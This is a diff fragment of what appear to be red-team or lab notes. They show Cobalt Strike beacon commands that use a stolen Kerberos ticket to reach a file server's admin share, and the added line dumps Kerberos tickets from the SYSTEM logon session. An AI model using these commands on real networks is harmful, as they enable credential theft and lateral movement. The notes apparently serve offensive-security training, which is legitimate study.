@@ -32,3 +32,5 @@ now we use the ticket to interact with the file server!
     beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
     beacon> ls \\lon-fs-1\c$\
         now we can!
+
+[04/30 20:50:26] beacon> krb_dump /luid:3e7 /service:cifs
